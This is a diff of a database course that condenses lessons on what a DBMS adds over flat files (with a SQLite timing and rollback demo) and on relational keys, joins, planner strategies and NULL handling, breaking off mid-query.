+A disk cannot fetch one byte; its unit is a block. The OS maps memory in pages. Aligning row storage to pages means neighbors ride along for free in the buffer pool — the same locality argument as CPU cache lines (Phase 32), one level down the hierarchy.
 
-| Mechanism the DBMS adds | What it buys                                                                              | What it costs                                                                                                      |
-| ----------------------- | ----------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------ |
-| A schema                | Invalid data becomes unwritable rather than merely unlikely                               | Every shape change is a migration, and migrations on large tables are genuinely hard                               |
-| Pages and a buffer pool | One logical read is one physical read, and hot data is served from memory                 | Memory dedicated to the database, and cold queries are dramatically slower than warm ones                          |
-| Write-ahead logging     | Crash recovery is exact, and commits are cheap sequential appends                         | Every write is written twice, once to the log and once to the data pages                                           |
-| A query planner         | You describe what you want, and adding an index changes performance without changing code | The plan can change under you when statistics shift, which is why a query that was fast for a year suddenly is not |
-| MVCC                    | Readers never block writers, so an analytics query cannot stall your writes               | Old row versions accumulate and must be vacuumed, and long-running transactions hold versions alive                |
-| A single owning process | Concurrency is correct by construction, and permissions are enforceable                   | That process is now a dependency to run, monitor, back up, and scale, which is Phase 65 and Phase 81             |
+**WHEN RELATIONAL IS NOT THE DEFAULT:**
 
+The relational model (tables, keys, SQL — Phase 61) is still the right default for most applications: strong consistency, ad-hoc queries, enforced relationships. Alternatives earn their place by access pattern:
 
-**SMALL WORKING EXAMPLE**
+| Store | Wins when… | Loses when… |
+| ----- | ---------- | ----------- |
+| Document (e.g. MongoDB) | Data is naturally nested and read as a whole | You need cross-document joins and strong consistency between them |
+| Key-value (e.g. Redis) | Point lookups by key at extreme speed | Any question other than "what is at this key" |
+| Column store (e.g. ClickHouse) | Aggregates over one column across huge tables | Fetching one complete transactional row |
+| Graph (e.g. Neo4j) | Deep traversals ("friends of friends") | Ordinary tabular reporting without path queries |
+
+"SQL or NoSQL" in an interview is answered by naming the access pattern — not by brand loyalty.
+
+**FILE VERSUS SQLITE, SIDE BY SIDE:**
 
 ```python playground=cs-phase-60-file-vs-sqlite
 import sqlite3, csv, os, time, random
 
-# ---------- The file version, with every failure mode visible ----------
+# ---------- The file version ----------
 with open("orders.csv", "w", newline="") as f:
     w = csv.writer(f)
     for i in range(1, 200_001):
         w.writerow([i, random.choice(["paid", "shipped"]), random.randint(1, 500)])
 
 def file_query_over(threshold):
-    """O(n). There is no other option: the file has no structure to exploit."""
     hits = 0
     with open("orders.csv", newline="") as f:
-        for row in csv.reader(f):          # EVERY row, EVERY time
+        for row in csv.reader(f):
             if int(row[2]) > threshold:
                 hits += 1
     return hits
@@ -10816,9 +10755,8 @@ print("file scan:", file_query_over(400), f"in {time.perf_counter()-start:.3f}s"
 
 # ---------- The database version ----------
 conn = sqlite3.connect("orders.db")
-conn.execute("PRAGMA journal_mode=WAL")     # turn on the write-ahead log
+conn.execute("PRAGMA journal_mode=WAL")
 
-# A SCHEMA: invalid rows are now REJECTED, not merely discouraged.
 conn.execute("""
 CREATE TABLE IF NOT EXISTS orders (
     id      INTEGER PRIMARY KEY,
@@ -10826,76 +10764,71 @@ CREATE TABLE IF NOT EXISTS orders (
     total   INTEGER NOT NULL CHECK (total > 0)
 )""")
 
-# A TRANSACTION: all 200k inserts commit together, or none of them do.
-with conn:                                   # `with` = BEGIN ... COMMIT/ROLLBACK
+with conn:
     conn.executemany(
         "INSERT OR REPLACE INTO orders (id, status, total) VALUES (?,?,?)",
-        ((i, random.choice(["paid","shipped"]), random.randint(1,500))
+        ((i, random.choice(["paid", "shipped"]), random.randint(1, 500))
          for i in range(1, 200_001)))
 
-# Without an index, the database is ALSO doing a full scan. It is not magic.
 start = time.perf_counter()
 print("db scan:  ", conn.execute(
     "SELECT COUNT(*) FROM orders WHERE total > 400").fetchone()[0],
     f"in {time.perf_counter()-start:.3f}s")
 
-# With an index (Phase 63), the same query stops reading most of the table.
 conn.execute("CREATE INDEX IF NOT EXISTS idx_total ON orders(total)")
 start = time.perf_counter()
 print("db indexed:", conn.execute(
     "SELECT COUNT(*) FROM orders WHERE total > 400").fetchone()[0],
     f"in {time.perf_counter()-start:.3f}s")
 
-# Ask the planner what it decided. This is the single most useful command
-# in this whole phase, and it works in every serious database.
-for row in conn.execute("EXPLAIN QUERY PLAN "
-                        "SELECT COUNT(*) FROM orders WHERE total > 400"):
-    print("plan:", row)      # look for SEARCH ... USING INDEX vs SCAN
+for row in conn.execute(
+        "EXPLAIN QUERY PLAN SELECT COUNT(*) FROM orders WHERE total > 400"):
+    print("plan:", row)
 
-# ---------- The schema rejecting bad data, which the CSV happily accepted ----
 try:
     conn.execute("INSERT INTO orders (id,status,total) VALUES (999999,'???',-5)")
 except sqlite3.IntegrityError as e:
-    print("rejected:", e)      # CHECK constraint failed
+    print("rejected:", e)
 
-# ---------- Atomicity, demonstrated ----------
 try:
-    with conn:                                  # this block is one transaction
+    with conn:
         conn.execute("UPDATE orders SET total = total - 100 WHERE id = 1")
         raise RuntimeError("simulated crash mid-transaction")
 except RuntimeError:
     pass
-print("after failed txn, id=1 total is unchanged:",
+print("after failed txn, id=1 total unchanged:",
       conn.execute("SELECT total FROM orders WHERE id=1").fetchone())
-# The first UPDATE was rolled back. In the CSV version, that write would
-# already be on disk, permanently, with nothing to undo it.
 
 conn.close()
 os.remove("orders.csv")
 ```
 
-**HOW TO EXPLAIN THIS IN AN INTERVIEW**
+Without an index, the database scan is not magic — it still touches every row. The index (Phase 63) is what turns "check everything" into "seek." The schema rejects bad rows the CSV would accept. The aborted transaction rolls back; a CSV write would already be on disk with nothing to undo.
 
-This section is rarely asked as its own question, and is constantly asked as the premise of others. "Why not just store this in a file, or in S3, or in a JSON blob" is a real design-interview probe, and the expected answer names concurrency, indexed access, atomicity, and enforced structure rather than saying "because databases are better." "SQL or NoSQL" is the more common version, and the answer that lands is a question back about the access pattern: whether the data is naturally relational, whether you need cross-entity consistency, and whether the queries are known in advance or ad hoc. Being able to say "a relational database by default, and here is the specific property that would make me choose otherwise" is much stronger than either enthusiasm or scepticism about NoSQL. The other place this pays off is debugging: knowing that a first query is slow because the buffer pool is cold, and that a commit is durable before the data page is written, are both the kind of detail that signals you have looked inside rather than only used the thing.
+| Mechanism | Buys you | Costs you |
+| --------- | -------- | --------- |
+| Schema | Invalid data becomes unwritable | Shape changes are migrations |
+| Pages + buffer pool | Hot data from memory; aligned I/O | Memory dedicated to the DB; cold vs warm gap |
+| WAL | Exact crash recovery; cheap sequential commits | Every change written twice (log + later pages) |
+| Query planner | Declarative SQL; indexes change perf without rewriting queries | Plans shift when statistics shift |
+| MVCC | Readers and writers coexist | Old versions accumulate; long txns hold them alive |
+| Single owning process | Correct concurrency and permissions | That process must be run, backed up, and scaled (Phase 65) |
 
-**PRACTICE UNTIL IT FEELS FAMILIAR**
+**PRACTICE:**
 
+| Difficulty | Task |
+| ---------- | ---- |
+| Easy | Run the playground; record the three timings. Why is the unindexed DB scan close to the file scan? |
+| Easy | Name which file problem each of schema, WAL, index, and concurrency control kills |
+| Medium | Turn WAL off in SQLite and measure insert throughput; explain sequential vs random writes |
+| Medium | For each domain, pick a store type in one sentence: bank ledger, session cache, product catalog with varying attributes, clickstream analytics, social graph |
+| Hard | Work through [cstack/db_tutorial](https://github.com/cstack/db_tutorial) through pages; explain why an unsorted array stops scaling |
+| Hard | Implement a tiny WAL: append intent, apply, kill mid-write, recover |
 
-| Difficulty | Task                                                                                                                                                                                                                              |
-| ---------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| Easy       | Run the code above and record the three timings. Explain why the unindexed database scan is not much faster than the file scan                                                                                                    |
-| Easy       | Write a CSV file, then write a program that appends to it from two processes simultaneously and show the corruption                                                                                                               |
-| Easy       | Name which of the four file problems in the block above each of atomicity, a schema, an index, and locking solves                                                                                                                 |
-| Medium     | Use `EXPLAIN QUERY PLAN` (or `EXPLAIN ANALYZE` in Postgres) on five of your own queries and identify which do a full scan                                                                                                         |
-| Medium     | Turn WAL mode off in the SQLite example and measure the insert throughput difference. Explain the result in terms of sequential versus random writes                                                                              |
-| Medium     | Store the same dataset in SQLite, in a JSON file, and in Redis, then time a point lookup, a range query, and an aggregate on each. Explain each winner                                                                            |
-| Medium     | For each of these, pick a database type and justify it in one sentence: a bank ledger, a session store, a product catalogue with wildly varying attributes, clickstream analytics over a billion events, a social graph           |
-| Hard       | Work through [cstack/db_tutorial](https://github.com/cstack/db_tutorial) at least as far as the chapter that introduces pages, and explain in your own words why it stops using an unsorted array                                 |
-| Hard       | Implement a tiny write-ahead log yourself: append intent records, apply changes, then kill the process mid-write and write a recovery routine that finishes or reverses the in-flight change                                      |
-| Hard       | Watch the first three [CMU Database Systems](https://www.youtube.com/playlist?list=PLSE8ODhjZXjbj8BMuIrRcacnQh20hmY9g) lectures and write a one-page summary of how a page-based storage engine differs from a log-structured one |
+**WHAT THIS UNLOCKS NEXT:**
 
+A DBMS solves the mechanical problems — concurrency, durability, crash safety. It still needs a *model* for how facts relate: tables, keys, and a language for asking questions. That language is SQL — Phase 61.
 
-**WHY THE NEXT TOPIC IS NEEDED - SQL & the Relational Model:** A DBMS solves the mechanical problems (concurrency, durability, crash safety). It still needs a *model* for how data should be organized and related - tables, keys, and the language that queries them. That is Phase 61.
 
 ---
 
@@ -10909,447 +10842,250 @@ This section is rarely asked as its own question, and is constantly asked as the
 
 **Track:** Data & Security
 
-**WHAT YOU WILL BE ABLE TO DO:** Write a correct multi-table JOIN (inner vs left), aggregate with `GROUP BY` / `HAVING`, factor a multi-step query with a CTE (`WITH`), choose primary/foreign keys for a small schema, and read a basic `EXPLAIN` plan well enough to say whether the planner used an index.
+**WHAT YOU WILL BE ABLE TO DO:** Write a correct multi-table JOIN (inner vs left), aggregate with `GROUP BY` / `HAVING`, factor a multi-step query with a CTE (`WITH`), choose primary/foreign keys for a small schema, and read a basic `EXPLAIN` well enough to say whether the planner used an index.
 
-**WHAT YOU SHOULD KNOW FIRST:** Phase 60 (what a DBMS adds over a file), Phase 36 (hash joins reuse the hash-table idea), Phase 10 (tables feel like collections of related rows).
+**WHAT YOU SHOULD KNOW FIRST:** Phase 60 — what a DBMS adds over a file.
+
+**LEARNING RESOURCES:**
+
+- [6 SQL Joins You MUST Know (Anton Putra)](https://www.youtube.com/watch?v=Yh4CrPHVBdE) — row pairing, not Venn diagrams
+- [SQLBolt](https://sqlbolt.com/) — interactive joins and aggregates
+- [PostgreSQL Tutorial](https://www.postgresql.org/docs/current/tutorial.html)
+- [SQL Execution Order (ByteByteGo)](https://www.youtube.com/watch?v=BHwzDmr6d7s)
+- [pgexercises.com](https://pgexercises.com/); [SQL Murder Mystery](https://mystery.knightlab.com/)
 
 ## 61.1 The Relational Model, Tables, Keys & SQL
 
-**WHY YOU ARE LEARNING THIS:** Data almost never stands alone - a user has orders, an order has line items, a line item references a product. The relational model represents everything as **tables** (rows and columns), and represents *relationships between* tables using **keys**: a **primary key** uniquely identifies a row within its own table, and a **foreign key** in one table points to a primary key in another, encoding the relationship without duplicating the related data.
+Phase 60 gave you a clerk who will not corrupt the cabinet. You still have to tell the clerk how facts relate. For a **bookstore**: a customer places many orders; an order contains many line items; a line item names a book. The **relational model** represents everything as **tables** (rows and columns) and relationships as **keys**.
 
-**SEE IT BEFORE YOU MEMORIZE IT**
+**TABLES ARE SETS OF FACTS:**
 
-- Best animated explanation: [6 SQL Joins You MUST Know, Animated + Practice (Anton Putra)](https://www.youtube.com/watch?v=Yh4CrPHVBdE) *(Composio YouTube)* - row pairing, not Venn diagrams
-- Alternative: [Learn MySQL joins in 5 minutes (Bro Code)](https://www.youtube.com/watch?v=G3lJAxg1cy8) *(Composio YouTube)*; [SQL Explained in 100 Seconds (Fireship)](https://www.youtube.com/watch?v=zsjvFFKOm3c)
-- Another angle: [Secret To Optimizing SQL Queries - SQL Execution Order (ByteByteGo)](https://www.youtube.com/watch?v=BHwzDmr6d7s) *(Composio YouTube)*; [Foreign Keys (CockroachDB)](https://www.youtube.com/watch?v=5kiMg7GXAsY)
-- Interactive: [SQLBolt](https://sqlbolt.com/) *(Composio fetch)*; [SQL Playground](https://fwdtools.com/sql-playground/) *(Composio web)*; [pgexercises.com](https://pgexercises.com/); [explain.dalibo.com](https://explain.dalibo.com/); [PostgreSQL EXPLAIN docs](https://www.postgresql.org/docs/current/sql-explain.html)
-- Written: [PostgreSQL Tutorial](https://www.postgresql.org/docs/current/tutorial.html) *(Composio fetch)*; [Select Star SQL](https://selectstarsql.com/); [Mode SQL Tutorial](https://mode.com/sql-tutorial/)
-- GitHub: [cstack/db_tutorial](https://github.com/cstack/db_tutorial); [erikgrinaker/toydb](https://github.com/erikgrinaker/toydb)
-- Practice: [LeetCode Database](https://leetcode.com/problemset/database/); [SQL Murder Mystery](https://mystery.knightlab.com/)
+A row is one fact. A **primary key (PK)** minimally identifies which fact you mean — without it you cannot reliably update or delete a single row. A **foreign key (FK)** is a claim that another table's fact must exist; the database *enforces* that claim. `ON DELETE CASCADE`, `SET NULL`, and `RESTRICT` are the three answers to "what happens to orders when a customer is deleted" — a real design choice, not trivia.
 
-**STEP-BY-STEP EXPLANATION**
+**Natural keys** (email, ISBN) read well until the real world changes them. **Surrogate keys** (auto-increment, UUID) never change and leak no business meaning. **Composite keys** fit junction tables where the *pair* is the fact. **Candidate keys** are any unique column set — uniqueness constraints on them catch bugs the PK alone would miss.
 
-The relational model rests on one idea that is easy to state and easy to underestimate: a table is a *set of facts*, and a row is one fact. Everything else follows. A **primary key** is whatever minimally identifies which fact you mean, and the reason every table needs one is that without it you cannot reliably update or delete a single row. A **foreign key** is a claim that another table's fact must exist, and the database *enforces* that claim, which is why a foreign key is a correctness feature and not merely documentation. `ON DELETE CASCADE`, `ON DELETE SET NULL`, and `ON DELETE RESTRICT` are the three answers to "what happens to the orders when the user is deleted," and choosing between them is a real design decision rather than a detail.
-
-Keys come in more varieties than most people learn. A **natural key** is a real-world identifier like an email address or an ISBN, and it reads beautifully until the real world changes it, which real-world identifiers do. A **surrogate key** is a meaningless auto-generated integer or UUID, which never changes and never leaks business meaning, at the cost of an extra column and a join to find anything human-readable. A **composite key** uses multiple columns together, which is the natural fit for a join table where the pair itself is the fact. And a **candidate key** is any column set that *could* serve as the primary key, which matters because uniqueness constraints on candidate keys catch bugs that the primary key alone would not.
-
-Relationships come in exactly three shapes, and recognizing which one you have is most of schema design. **One-to-many** is the common case and is implemented by putting a foreign key on the *many* side: one user has many orders, so `orders.user_id` exists and `users` has no order column. Getting this direction backwards is the most common beginner error, because putting a list of order ids in the users table means either a repeated column or a comma-separated string, both of which break the model. **Many-to-many** cannot be expressed with a foreign key on either side, so it requires a third **junction table** holding one row per pairing: a student takes many courses and a course has many students, so `enrollments(student_id, course_id)` exists, and that table is usually also where per-pairing facts like the enrolment date belong. **One-to-one** is a foreign key with a uniqueness constraint on it, and it is usually a sign you should have used one table, unless you are splitting rarely-read columns out for performance or separating data with different access permissions.
-
-Joins are where SQL earns its keep, and the important thing is that a join is a *row-pairing operation*, not a set operation on the tables. An **inner join** keeps only pairs that matched. A **left join** keeps every row from the left side and fills the right side with nulls where nothing matched, which is what you want for "every user and their order count, including users with none." A **right join** is the same in reverse and is rarely used because you can always flip the tables. A **full outer join** keeps unmatched rows from both. A **cross join** produces every possible pairing, which is almost always a mistake and occasionally exactly what you want. And a **self join** joins a table to itself, which is how you express "each employee and their manager" when both are rows in the same table.
-
-The internal steps underneath matter because they explain performance. The planner has three join strategies available and picks between them using statistics. A **nested loop join** scans one side and, for each row, looks up matches in the other, which is $O(n\cdot m)$ unless the inner side has an index, in which case it is $O(n\log m)$ and is the right choice when one side is tiny. A **hash join** builds a hash table (Phase 36) of the smaller side in memory and then probes it once per row of the larger side, which is $O(n+m)$ and is the workhorse for large equality joins. A **merge join** requires both sides sorted and then walks them in lockstep like the merge step of merge sort (Phase 39), which is excellent when the data is already sorted by the join key, typically because an index provides that order. Reading `EXPLAIN` output and seeing which of these three the planner chose is the difference between guessing at performance and knowing.
-
-One more thing that trips people up constantly, and comes up in interviews as a trick question: `NULL` is not a value but a marker for "unknown," so `NULL = NULL` is not true, it is unknown. That is why you must write `IS NULL` rather than `= NULL`, why `COUNT(column)` skips nulls while `COUNT(*)` does not, why a row with a null never survives a `WHERE column != 'x'` filter, and why `NOT IN` with a subquery that can return nulls silently returns nothing at all. Three-valued logic is the single most common source of quietly wrong SQL.
-
-**PICTURE IT LIKE THIS**
-
-A library card catalog: each book has a unique catalog number (primary key). A "borrowed books" log doesn't rewrite each book's full title and author every time it's checked out - it just records the catalog number (foreign key) and who has it, avoiding duplicated, potentially inconsistent copies of the book's details.
-
-**SQL - the language for asking the relational model questions:** SQL (Structured Query Language) lets you describe *what* data you want, not *how* to fetch it step by step - the database's query planner decides the actual retrieval strategy, which is what makes indexes (Phase 63) transparent: you don't rewrite your query when an index is added, the planner just starts using it.
-
-```sql
--- Users table and Orders table, related by a foreign key
-CREATE TABLE users (
-    id INTEGER PRIMARY KEY,
-    name TEXT NOT NULL
-);
-
-CREATE TABLE orders (
-    id INTEGER PRIMARY KEY,
-    user_id INTEGER REFERENCES users(id),   -- foreign key: the relationship
-    total DECIMAL NOT NULL
-);
-
--- A JOIN reconstructs the relationship at query time
-SELECT users.name, orders.total
-FROM users
-JOIN orders ON users.id = orders.user_id
-WHERE orders.total > 100;
-```
-
-**A JOIN, internally:** conceptually, the database matches every row in `orders` to the row in `users` whose `id` equals that order's `user_id` the relational equivalent of the hash-table lookup from Phase 36 (and in fact, one common JOIN strategy, a *hash join*, does exactly that: build a hash table of one side, then probe it for each row of the other).
-
-**Internal Working, Step by Step - the three relationship shapes and what a join actually produces:**
+**WHERE THE FOREIGN KEY LIVES:**
 
 ```text
-THE THREE SHAPES, and where the foreign key goes:
+ONE-TO-MANY (one customer, many orders)  -- FK on the MANY side
+   customers                 orders
+   +----+--------+           +----+-------------+-------+
+   | id | name   |           | id | customer_id | total |
+   +----+--------+           +----+-------------+-------+
+   |  1 | Ada    |<---+      |  9 |           1 |   120 |
+   |  2 | Grace  |<-+ |      | 10 |           1 |    45 |
+   +----+--------+  | |      | 11 |           2 |   300 |
+                    | +--------------+
+                    +----------------+
 
-ONE-TO-MANY  (one user, many orders)   <-- FK lives on the MANY side
-   users                    orders
-   +----+-------+           +----+---------+-------+
-   | id | name  |           | id | user_id | total |
-   +----+-------+           +----+---------+-------+
-   |  1 | Ada   |<---+      |  9 |       1 |   120 |
-   |  2 | Grace |<-+ |      | 10 |       1 |    45 |
-   +----+-------+  | |      | 11 |       2 |   300 |
-                   | |      +----+---------+-------+
-                   | +--------------+  (two orders point at user 1;
-                   +----------------+   nothing in `users` changes)
+   WRONG: customers(id, name, order_ids TEXT)  -- "9,10"
+          cannot index, constrain, or join cleanly.
 
-   WRONG:  users(id, name, order_ids TEXT)  -- "9,10"
-           Now you cannot index it, cannot constrain it, cannot join on it,
-           and deleting order 9 leaves a dangling "9" nobody notices.
+MANY-TO-MANY (books <-> authors)  -- needs a THIRD (junction) table
+   books        book_authors              authors
+   +----+       +---------+----------+    +----+
+   | id |<------| book_id | author_id|--->| id |
+   +----+       +---------+----------+    +----+
+                PRIMARY KEY (book_id, author_id)
+                Per-pairing facts (role, ordinal) belong HERE.
 
-MANY-TO-MANY  (students <-> courses)   <-- needs a THIRD table
-   students          enrollments                 courses
-   +----+------+     +------------+-----------+  +----+---------+
-   | id | name |     | student_id | course_id |  | id | title   |
-   +----+------+     +------------+-----------+  +----+---------+
-   |  1 | Ada  |<----|          1 |       101 |->| 101| Algebra |
-   |  2 | Bob  |<-+  |          1 |       102 |  | 102| Physics |
-   +----+------+  |  |          2 |       101 |  +----+---------+
-                  +--+------------+-----------+
-                     PRIMARY KEY (student_id, course_id)  <- composite:
-                     the PAIR is the fact, and this also prevents
-                     enrolling the same student twice by construction.
-                     Per-pairing facts (enrolled_on, grade) belong HERE.
-
-ONE-TO-ONE  (user <-> profile)   <-- FK + a UNIQUE constraint
-   users                    profiles
-   +----+-------+           +----+---------------+----------+
-   | id | name  |           | id | user_id UNIQUE| bio      |
-   +----+-------+           +----+---------------+----------+
-   |  1 | Ada   |<----------|  7 |             1 | "..."    |
-   +----+-------+           +----+---------------+----------+
-   Without UNIQUE this is just one-to-many. Usually this should have
-   been one table, unless you are splitting off rarely-read columns
-   or data with different access permissions.
-
-WHAT EACH JOIN ACTUALLY RETURNS. Two tables, deliberately imperfect:
-
-   users                         orders
-   +----+-------+                +----+---------+
-   | id | name  |                | id | user_id |
-   +----+-------+                +----+---------+
-   |  1 | Ada   |                |  9 |       1 |
-   |  2 | Grace |                | 10 |       1 |
-   |  3 | Lin   | <- no orders   | 11 |       2 |
-   +----+-------+                | 12 |    NULL | <- orphan: no user
-                                 +----+---------+
-
- INNER JOIN users ON users.id = orders.user_id
-   -> ONLY matched pairs. Lin disappears. The orphan disappears.
-      Ada  | 9
-      Ada  | 10
-      Grace| 11
-      NOTE: Ada appears TWICE. A join can return MORE rows than either
-      table has. This is why "joins duplicate my rows" is not a bug.
-
- LEFT JOIN  (users on the left)
-   -> every USER, matched or not. Lin appears with NULLs.
-      Ada  | 9
-      Ada  | 10
-      Grace| 11
-      Lin  | NULL   <-- this row is the entire reason LEFT JOIN exists
-      Use this for "every user and their order count, including zero."
-      And note: COUNT(orders.id) gives Lin 0, while COUNT(*) gives Lin 1.
-      That single distinction is a very common interview trap.
-
- RIGHT JOIN  (orders on the right kept)
-   -> every ORDER, matched or not. The orphan appears with NULLs.
-      Rarely written, because swapping the tables and using LEFT is clearer.
-
- FULL OUTER JOIN
-   -> everything: matched pairs, plus Lin, plus the orphan.
-
- CROSS JOIN
-   -> every possible pairing: 3 users x 4 orders = 12 rows.
-      Almost always an accidental missing ON clause. Occasionally
-      exactly what you want (generating a calendar x products grid).
-
-HOW THE PLANNER ACTUALLY EXECUTES ONE. Same query, three strategies:
-
- SELECT u.name, o.total FROM users u JOIN orders o ON u.id = o.user_id;
-
- [1] NESTED LOOP JOIN                 for each row in users:
-       users:  1, 2, 3                    for each row in orders:
-       orders: 9,10,11,12                     if match: emit
-     3 x 4 = 12 comparisons.  O(n * m).
-     BUT with an index on orders.user_id, the inner loop becomes a seek:
-     O(n log m). Correct choice when one side is TINY.
-
- [2] HASH JOIN                        build phase, then probe phase
-       build a hash table of the SMALLER side, keyed on the join column:
-          { 1 -> Ada, 2 -> Grace, 3 -> Lin }     <- Phase 36, verbatim
-       then scan orders ONCE, probing:
-          order 9  -> hash lookup 1 -> Ada   -> emit
-          order 10 -> hash lookup 1 -> Ada   -> emit
-          order 11 -> hash lookup 2 -> Grace -> emit
-          order 12 -> hash lookup NULL -> no match -> drop
-     O(n + m). The workhorse for large EQUALITY joins.
-     Cost: the build side must fit in memory, or it spills to disk.
-
- [3] MERGE JOIN                       walk both, already sorted, in lockstep
-       users  sorted by id:       1    2    3
-       orders sorted by user_id:  1  1  2       NULL
-                                  ^  ^  ^
-       advance whichever pointer is behind, emit on equality.
-     O(n + m) with NO memory cost, but REQUIRES sorted input, which
-     usually means an index provides the order for free. Exactly the
-     merge step from Phase 39's merge sort.
-
- The planner picks one using its statistics. `EXPLAIN` tells you which.
- A query that got slow after a data change is very often the planner
- switching from [2] to [1] because its statistics went stale.
-
-THREE-VALUED LOGIC, the quiet source of wrong answers:
-
-   NULL = NULL        -> UNKNOWN  (not TRUE, and not FALSE)
-   NULL <> 'x'        -> UNKNOWN  -> the row is FILTERED OUT
-   WHERE status <> 'shipped'   -> silently EXCLUDES rows where status IS NULL
-   WHERE status IS NULL        <- the only way to test for it
-
-   COUNT(*)        -> counts rows
-   COUNT(col)      -> counts rows where col IS NOT NULL   <- different answer
-
-   id NOT IN (SELECT user_id FROM orders)
-        -> if ANY user_id is NULL, this returns NOTHING AT ALL,
-           because `id <> NULL` is UNKNOWN for every row.
-           Use NOT EXISTS instead. This exact bug is in production
-           somewhere near you right now.
+ONE-TO-ONE (customer <-> profile)  -- FK + UNIQUE
+   Without UNIQUE this is just one-to-many. Often one table would do,
+   unless you split rarely-read columns or different permissions.
 ```
 
-**SMALL WORKING EXAMPLE**
+**ASKING QUESTIONS WITH SQL:**
+
+SQL describes *what* you want; the planner decides *how*. Joins are **row-pairing**, not set Venn diagrams.
+
+```text
+customers                    orders
++----+-------+               +----+-------------+
+| id | name  |               | id | customer_id |
++----+-------+               +----+-------------+
+|  1 | Ada   |               |  9 |           1 |
+|  2 | Grace |               | 10 |           1 |
+|  3 | Lin   | <- no orders  | 11 |           2 |
++----+-------+               | 12 |        NULL | <- orphan
+                             +----+-------------+
+
+ INNER JOIN  -> only matched pairs. Lin vanishes. Orphan vanishes.
+               Ada appears TWICE (one per order) — not a bug.
+
+ LEFT JOIN (customers left) -> every customer; Lin with NULLs.
+               COUNT(orders.id) gives Lin 0; COUNT(*) gives Lin 1.
+
+ CROSS JOIN -> every pairing (3×4=12). Usually a missing ON clause.
+```
+
+Three planner strategies (same query, different costs):
+
+```text
+SELECT c.name, o.total FROM customers c JOIN orders o ON c.id = o.customer_id;
+
+ [1] NESTED LOOP  — for each customer, probe orders.
+     O(n·m); with an index on orders.customer_id → O(n log m).
+     Right when one side is tiny.
+
+ [2] HASH JOIN    — build a hash table of the smaller side (Phase 36),
+     probe once per row of the larger. O(n+m). Workhorse for equality.
+
+ [3] MERGE JOIN   — both sides sorted; walk in lockstep (Phase 39 merge).
+     O(n+m), little memory; needs sorted input (often from an index).
+
+ EXPLAIN tells you which. A sudden slowdown is often a plan change
+ after statistics went stale.
+```
+
+**NULL** is unknown, not a value: `NULL = NULL` is unknown; use `IS NULL`. `COUNT(col)` skips nulls; `COUNT(*)` does not. `NOT IN (subquery)` returns nothing if the subquery yields any NULL — use `NOT EXISTS` or an anti-join instead.
 
 ```sql
--- ============ 1. The three relationship shapes, as real DDL ============
-CREATE TABLE users (
-    id          INTEGER PRIMARY KEY,                 -- surrogate key
-    email       TEXT    NOT NULL UNIQUE,             -- candidate/natural key
-    name        TEXT    NOT NULL,
-    created_at  TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP
-);
-
--- ONE-TO-MANY: the foreign key lives on the MANY side.
-CREATE TABLE orders (
-    id       INTEGER PRIMARY KEY,
-    user_id  INTEGER NOT NULL,
-    total    INTEGER NOT NULL CHECK (total > 0),
-    status   TEXT    NOT NULL DEFAULT 'paid',
-    FOREIGN KEY (user_id) REFERENCES users(id)
-        ON DELETE RESTRICT        -- refuse to delete a user who has orders.
-                                  -- CASCADE would delete their orders too;
-                                  -- SET NULL would orphan them. Choosing
-                                  -- between these three is a real decision.
-);
-
--- MANY-TO-MANY: a junction table, whose PRIMARY KEY is the pair itself.
-CREATE TABLE products (
+CREATE TABLE customers (
     id    INTEGER PRIMARY KEY,
+    email TEXT NOT NULL UNIQUE,
     name  TEXT NOT NULL
 );
 
-CREATE TABLE order_items (
-    order_id    INTEGER NOT NULL REFERENCES orders(id)   ON DELETE CASCADE,
-    product_id  INTEGER NOT NULL REFERENCES products(id) ON DELETE RESTRICT,
-    quantity    INTEGER NOT NULL CHECK (quantity > 0),
-    unit_price  INTEGER NOT NULL,          -- captured at purchase time, on
-                                           -- purpose: the product's price
-                                           -- may change later, and this
-                                           -- order's price must not.
-    PRIMARY KEY (order_id, product_id)     -- composite: prevents the same
-);                                         -- product twice on one order
-
--- ONE-TO-ONE: a foreign key plus UNIQUE.
-CREATE TABLE profiles (
-    id       INTEGER PRIMARY KEY,
-    user_id  INTEGER NOT NULL UNIQUE REFERENCES users(id) ON DELETE CASCADE,
-    bio      TEXT
+CREATE TABLE orders (
+    id          INTEGER PRIMARY KEY,
+    customer_id INTEGER NOT NULL REFERENCES customers(id) ON DELETE RESTRICT,
+    total       INTEGER NOT NULL CHECK (total > 0),
+    status      TEXT NOT NULL DEFAULT 'paid'
 );
 
--- ============ 2. The joins, each answering a different question ============
+CREATE TABLE books (
+    id    INTEGER PRIMARY KEY,
+    title TEXT NOT NULL,
+    price INTEGER NOT NULL
+);
 
--- INNER: only users who actually ordered. Users with no orders vanish.
-SELECT u.name, o.id AS order_id, o.total
-FROM users u
-JOIN orders o ON u.id = o.user_id
+CREATE TABLE order_items (
+    order_id   INTEGER NOT NULL REFERENCES orders(id) ON DELETE CASCADE,
+    book_id    INTEGER NOT NULL REFERENCES books(id) ON DELETE RESTRICT,
+    quantity   INTEGER NOT NULL CHECK (quantity > 0),
+    unit_price INTEGER NOT NULL,  -- captured at purchase time (Phase 62)
+    PRIMARY KEY (order_id, book_id)
+);
+
+-- INNER: buyers who actually ordered
+SELECT c.name, o.id AS order_id, o.total
+FROM customers c
+JOIN orders o ON c.id = o.customer_id
 WHERE o.total > 100;
 
--- LEFT: EVERY user, including those with zero orders.
--- Note COUNT(o.id), not COUNT(*): COUNT(*) would report 1 for a user
--- with no orders, because the LEFT JOIN produced one all-NULL row.
-SELECT u.name,
-       COUNT(o.id)            AS order_count,
+-- LEFT: every customer, including zero orders
+SELECT c.name,
+       COUNT(o.id) AS order_count,
        COALESCE(SUM(o.total), 0) AS lifetime_value
-FROM users u
-LEFT JOIN orders o ON u.id = o.user_id
-GROUP BY u.id, u.name
-ORDER BY lifetime_value DESC;
+FROM customers c
+LEFT JOIN orders o ON c.id = o.customer_id
+GROUP BY c.id, c.name;
 
--- Traversing the many-to-many, which is two joins through the junction table.
-SELECT u.name, o.id AS order_id, p.name AS product, oi.quantity
-FROM users u
-JOIN orders      o  ON u.id  = o.user_id
-JOIN order_items oi ON o.id  = oi.order_id
-JOIN products    p  ON p.id  = oi.product_id
-ORDER BY u.name, o.id;
-
--- SELF JOIN: rows related to other rows in the SAME table.
--- LEFT, so the CEO (manager_id IS NULL) is not silently dropped.
-SELECT e.name AS employee, m.name AS manager
-FROM employees e
